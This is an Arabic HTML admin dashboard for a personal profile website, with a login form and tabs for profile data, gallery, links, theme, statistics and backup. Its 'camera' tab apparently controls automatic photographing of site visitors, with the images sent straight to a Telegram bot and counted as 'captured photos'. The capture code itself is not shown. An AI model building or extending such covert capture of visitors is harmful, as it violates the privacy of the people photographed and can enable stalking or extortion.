<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة التحكم — طه</title>
<link rel="stylesheet" href="style.css">
<style>
  body{padding:20px}
  .login{max-width:400px;margin:80px auto;background:var(--card);padding:30px;border-radius:18px;border:1px solid var(--border)}
  .login h2{text-align:center;margin-bottom:20px;color:var(--accent)}
  .login input{width:100%;padding:12px;margin-bottom:12px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:15px}
  .login button{width:100%;padding:12px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:15px}
  .dash{max-width:1100px;margin:0 auto}
  .dash h1{color:var(--accent);margin-bottom:20px;display:flex;justify-content:space-between;align-items:center}
  .tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px;border-bottom:1px solid var(--border);padding-bottom:10px}
  .tab{padding:8px 16px;background:var(--card);border:1px solid var(--border);border-radius:10px;cursor:pointer;color:var(--text);font-size:14px}
  .tab.active{background:var(--accent);color:#000;font-weight:700}
  .panel{display:none;background:var(--card);padding:24px;border-radius:16px;border:1px solid var(--border);margin-bottom:20px}
  .panel.active{display:block}
  .field{margin-bottom:14px}
  .field label{display:block;margin-bottom:6px;color:var(--accent);font-size:14px;font-weight:600}
  .field input,.field textarea,.field select{width:100%;padding:10px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:14px;font-family:inherit}
  .field textarea{min-height:80px;resize:vertical}
  .save-btn{padding:10px 22px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;margin-top:10px}
  .item-row{display:flex;gap:8px;padding:8px;background:var(--bg2);border-radius:10px;margin-bottom:8px;align-items:center}
  .item-row input{flex:1;padding:8px;background:var(--card);border:1px solid var(--border);border-radius:8px;color:var(--text)}
  .item-row button{background:#ff4444;color:#fff;border:none;border-radius:8px;padding:6px 10px;cursor:pointer;font-size:12px}
  .add-btn{background:var(--accent);color:#000;border:none;border-radius:8px;padding:8px 16px;cursor:pointer;font-weight:700;margin-top:8px}
  .stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px}
  .stat{background:var(--bg2);padding:16px;border-radius:12px;text-align:center;border:1px solid var(--border)}
  .stat b{display:block;font-size:28px;color:var(--accent);margin-bottom:4px}
  .toggle{display:flex;justify-content:space-between;align-items:center;padding:10px;background:var(--bg2);border-radius:10px;margin-bottom:8px}
  .toggle input{width:auto}
  .msg{padding:10px;background:#1a4d1a;color:#80ff80;border-radius:8px;margin-bottom:10px;display:none}
</style>
</head>
<body>
<div class="login" id="login">
  <h2>🔐 دخول المالك</h2>
  <input id="user" placeholder="اسم المستخدم" autocomplete="username">
  <input id="pass" type="password" placeholder="كلمة السر" autocomplete="current-password">
  <button id="loginBtn">دخول</button>
</div>

<div class="dash" id="dash" style="display:none">
  <h1>لوحة التحكم <button id="logoutBtn" class="save-btn" style="background:#ff4444;color:#fff">خروج</button></h1>
  <div id="msg" class="msg"></div>

  <div class="tabs">
    <button class="tab active" data-tab="info">البيانات</button>
    <button class="tab" data-tab="sections">الأقسام</button>
    <button class="tab" data-tab="skills">المهارات</button>
    <button class="tab" data-tab="gallery">الصور</button>
    <button class="tab" data-tab="links">روابط</button>
    <button class="tab" data-tab="theme">الثيم</button>
    <button class="tab" data-tab="camera">الكاميرا</button>
    <button class="tab" data-tab="stats">إحصائيات</button>
    <button class="tab" data-tab="backup">نسخ احتياطي</button>
    <button class="tab" data-tab="features">الميزات</button>
  </div>

  <div class="panel active" id="panel-info">
    <div class="field"><label>الاسم</label><input id="fName"></div>
    <div class="field"><label>الصفة</label><input id="fTitle"></div>
    <div class="field"><label>المكان</label><input id="fLoc"></div>
    <div class="field"><label>تاريخ الميلاد</label><input id="fBirth" type="date"></div>
    <div class="field"><label>الحكمة</label><textarea id="fQuote"></textarea></div>
    <div class="field"><label>عني</label><textarea id="fAbout"></textarea></div>
    <div class="field"><label>واتساب</label><input id="fWA"></div>
    <div class="field"><label>فيسبوك</label><input id="fFB"></div>
    <div class="field"><label>إنستجرام</label><input id="fIG"></div>
    <button class="save-btn" id="saveInfo">حفظ</button>
  </div>

  <div class="panel" id="panel-sections">
    <p style="margin-bottom:12px;color:var(--muted)">إظهار/إخفاء الأقسام</p>
    <div id="sectionsList"></div>
  </div>

  <div class="panel" id="panel-skills">
    <div id="skillsList"></div>
    <button class="add-btn" id="addSkill">+ مهارة جديدة</button>
    <button class="save-btn" id="saveSkills">حفظ</button>
  </div>

  <div class="panel" id="panel-gallery">
    <div class="field"><label>إضافة صورة (رابط أو رفع من الجهاز)</label><input id="galleryUrl" placeholder="https://..."><input type="file" id="galleryFile" accept="image/*" style="margin-top:8px"></div>
    <button class="add-btn" id="addGallery">+ إضافة</button>
    <div id="galleryList" style="margin-top:14px"></div>
    <button class="save-btn" id="saveGallery">حفظ</button>
  </div>

  <div class="panel" id="panel-links">
    <div id="linksList"></div>
    <button class="add-btn" id="addLink">+ رابط جديد</button>
    <button class="save-btn" id="saveLinks">حفظ</button>
  </div>

  <div class="panel" id="panel-theme">
    <div class="field"><label>الثيم الافتراضي</label>
      <select id="fTheme">
        <option value="dark">داكن</option>
        <option value="light">فاتح</option>
        <option value="neon">نيون</option>
        <option value="royal">ملكي</option>
      </select>
    </div>
    <button class="save-btn" id="saveTheme">حفظ</button>
  </div>

  <div class="panel" id="panel-camera">
    <div class="toggle"><span>تفعيل التصوير التلقائي</span><input type="checkbox" id="camToggle"></div>
    <div class="toggle"><span>وضع الصيانة</span><input type="checkbox" id="maintToggle"></div>
    <div class="field"><label>رسالة الصيانة</label><input id="maintMsg"></div>
    <p style="color:var(--muted);font-size:13px;margin-top:12px">الصور تُرسل مباشرة لبوت تليجرام. لا تُخزن على السيرفر.</p>
    <button class="save-btn" id="saveCamera">حفظ</button>
  </div>

  <div class="panel" id="panel-stats">
    <div class="stat-grid">
      <div class="stat"><b id="sVisits">0</b>زيارات</div>
      <div class="stat"><b id="sCaptures">0</b>صور ملتقطة</div>
      <div class="stat"><b id="sGallery">0</b>صور في المعرض</div>
      <div class="stat"><b id="sLinks">0</b>روابط إضافية</div>
    </div>
    <button class="save-btn" id="refreshStats" style="margin-top:14px">تحديث</button>
  </div>

  <div class="panel" id="panel-backup">
    <p style="margin-bottom:12px;color:var(--muted)">صدّر البيانات كملف JSON، أو استرجع نسخة سابقة.</p>
    <button class="save-btn" id="exportBtn">📥 تصدير نسخة</button>
    <div class="field" style="margin-top:14px"><label>استيراد نسخة</label><input type="file" id="importFile" accept=".json"></div>
    <button class="save-btn" id="resetBtn" style="background:#ff4444;color:#fff">🗑️ إعادة تعيين</button>
  </div>

  <div class="panel" id="panel-features">
    <h3 style="color:var(--accent);margin-bottom:12px">قائمة الميزات (100)</h3>
    <div id="featuresList" style="max-height:500px;overflow-y:auto;font-size:13px;line-height:1.8"></div>
  </div>
</div>

<script src="config.js"></script>
<script src="admin.js"></script>
</body>
</html>
